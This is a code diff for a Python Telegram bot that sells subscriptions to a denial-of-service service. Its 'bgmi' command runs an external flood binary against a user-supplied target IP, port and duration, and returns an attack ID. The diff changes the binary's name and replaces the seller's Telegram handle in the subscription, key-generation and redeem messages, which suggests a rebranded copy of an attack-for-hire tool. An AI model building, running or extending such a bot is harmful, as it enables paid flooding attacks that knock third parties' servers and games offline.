@@ -134,10 +134,10 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = str(update.message.from_user.id)
     username = update.message.from_user.username
     if user_id not in users:
-        await update.message.reply_text("❌ You don't have an active subscription. Please contact the admin for assistance.Buy Form @rajaraj_04", reply_markup=main_menu_keyboard())
+        await update.message.reply_text("❌ You don't have an active subscription. Please contact the admin for assistance.Buy Form @MrRanDom8", reply_markup=main_menu_keyboard())
     else:
         expiration_date = users[user_id]
-        await update.message.reply_text(f"👋 Welcome {username}!\n Your subscription is active until {expiration_date}.\n This Tool is provided by @rajaraj_04", reply_markup=main_menu_keyboard())
+        await update.message.reply_text(f"👋 Welcome {username}!\n Your subscription is active until {expiration_date}.\n This Tool is provided by @MrRanDom8", reply_markup=main_menu_keyboard())
 
 async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = str(update.message.from_user.id)
@@ -163,7 +163,7 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         return
 
     # Updated command to remove protocol (udp/tcp)
-    command = ['./raja', target_ip, str(port), str(duration), str(DEFAULT_THREADS)]
+    command = ['./2111', target_ip, str(port), str(duration), str(DEFAULT_THREADS)]
     try:
         process = subprocess.Popen(command)
         # Generate and display a unique attack ID
@@ -285,7 +285,7 @@ async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         else:
             response = "Usage: /genkey <amount> <hours/days>"
     else:
-        response = "ONLY OWNER CAN USE💀OWNER @rajaraj_04"
+        response = "ONLY OWNER CAN USE💀OWNER @MrRanDom8"
 
     await update.message.reply_text(response)
 
@@ -307,7 +307,7 @@ async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
             save_keys()
             response = f"✅Key redeemed successfully!"
         else:
-            response = "Invalid or expired key buy from @rajaraj_04."
+            response = "Invalid or expired key buy from @MrRanDom8."
     else:
         response = "Usage: /redeem <key>"
 
